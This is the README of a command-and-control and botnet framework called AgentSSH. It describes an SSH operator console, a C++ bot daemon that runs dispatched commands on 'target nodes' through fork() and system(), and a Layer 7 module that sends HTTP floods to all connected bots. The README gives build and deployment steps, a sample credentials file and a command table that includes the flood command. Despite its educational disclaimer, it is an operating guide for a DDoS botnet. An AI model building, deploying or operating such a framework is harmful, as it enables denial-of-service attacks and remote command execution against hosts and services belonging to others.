# AgentSSH C2 & Botnet Management Framework

A high-performance, asynchronous Command & Control (C2) server and bot orchestration engine built with **.NET 10.0** (C#) and lightweight **C++20** clients. Features custom VT100/ANSI terminal emulation over SSH, real-time connection counters, modular JSON-driven method dispatching, and dynamic remote endpoint resolution.

---

## Architecture Overview

```
+--------------------------------------------------------------------------+
|                                SSH Clients                               |
|                           (Operators / Terminal)                         |
+--------------------------------------------------------------------------+
                                     |
                                     |  SSH Protocol (Port 1337)
                                     v
+--------------------------------------------------------------------------+
|                              Agent (Server)                              |
|  - Custom SSH Server (FxSsh Engine)                                      |
|  - Real-time Terminal Stream & ANSI Prompt Engine                        |
|  - Thread-Safe Bot Pool Manager & Socket Dispatcher                      |
|  - Modular Methods Pipeline (methods.json)                               |
+--------------------------------------------------------------------------+
                                     ^
                                     |  TCP Socket Stream (Port 1338)
                                     |  (Keep-Alive / Dynamic Polling)
+--------------------------------------------------------------------------+
|                               Bot Cluster                                |
|  - bot (C++ Worker Daemon): Heartbeat, Command Handler, Fork Execution   |
|  - http (C++ L7 Engine): Rate-limited HTTP/1.1 load generator            |
+--------------------------------------------------------------------------+
```

---

## Key Features

- **Embedded SSH Interface:** Native VT100 terminal emulation with colored interactive prompt (`[user@aihui]`), backspace, clean buffer handling, and multi-user authentication via `users.json`.
- **Dynamic Terminal Title Tracking:** Automatically updates the operator's window/tab title in real-time (`Connected <N>`) via ANSI escape sequences as bots join and leave the swarm.
- **Configurable Command Dispatching (`methods.json`):** Add, modify, or extend execution payloads without recompiling the server. Templates support positional argument replacement (e.g. `{host}`, `{port}`, `{time}`).
- **Lightweight Bot Client:** Ultra-compact C++ agent utilizing raw sockets, `poll()` multiplexing, automatic background fork execution (`fork()` + `system()`), and dynamic fallback endpoint resolution via remote URL.
- **Layer 7 HTTP Engine:** High-performance rate-limited HTTP/1.1 multi-threaded request engine.

---

## Directory Structure

```
├── Agent.csproj            # .NET 10.0 Server Project File
├── Program.cs              # Core SSH Server, Bot Listener & Command Dispatcher
├── methods.json            # Method templates & syntax definitions
├── users.json              # Authorized SSH credentials
├── hostkey_rsa.pem         # RSA SSH Host Key (auto-generated if missing)
├── hostkey_ecdsa.pem       # ECDSA SSH Host Key (auto-generated if missing)
├── bots/
│   ├── Makefile            # C++ build automation
│   ├── bot.cpp             # Bot client daemon (connection & execution)
│   └── http.cpp            # Layer 7 HTTP load generator
└── README.md
```

---

## Configuration

### 1. User Authentication (`users.json`)
Configure authorized operators who can log into the SSH management console:

```json
[
  {
    "username": "root",
    "password": "password123"
  }
]
```

### 2. Attack / Execution Methods (`methods.json`)
Define command templates dispatched to connected bots:

```json
[
  {
    "name": "http",
    "cmd": "./http {host} {port} {time}"
  }
]
```

Placeholders within `{...}` are automatically mapped to space-separated arguments provided by the operator.

---

## Compilation & Installation

### Prerequisites
- **.NET SDK 10.0+**
- **GCC / G++ 11+**
- **Make**

### 1. Build Server (Agent)
```bash
# Debug build
dotnet build

# Or publish standalone / optimized binary
dotnet publish -c Release -r linux-x64 --self-contained false -o bin/publish
```

### 2. Build Bot Client & Modules
```bash
make -C bots
```
This produces optimized binaries in the `bots/` directory:
- `bots/bot`
- `bots/http`

---

## Running the Framework

### Starting the Agent Server
```bash
# Run with default ports (SSH: 1337, Bot Listener: 1338)
./agent

# Or specify custom ports
./agent -p 2222 -b 2223
```

### Starting the Bot Client
Deploy `bot` and modular executables (e.g., `http`) in the same directory on the target nodes:
```bash
chmod +x bot http
./bot &
```

### Operator Login
Connect using any standard SSH client:
```bash
ssh root@<server_ip> -p 1337
```

---

## Terminal Commands

Once connected via SSH, the following commands are supported:

| Command | Description |
| :--- | :--- |
| `help` | Displays available management commands |
| `methods` | Lists available attack / execution methods categorized under Layer 7 |
| `bots` | Displays the current number of connected bot clients |
| `clear` / `cls` | Clears the terminal screen |
| `exit` / `quit` | Terminates the SSH session |
| `http <host> <port> <time>` | Dispatches HTTP flood command to all active bots |

---

## Disclaimer

This software is developed strictly for **educational, authorized penetration testing, and security research purposes only**. Unauthorized access to computer systems or executing denial-of-service attacks without prior mutual consent is illegal. The authors assume no liability for misuse of this code.
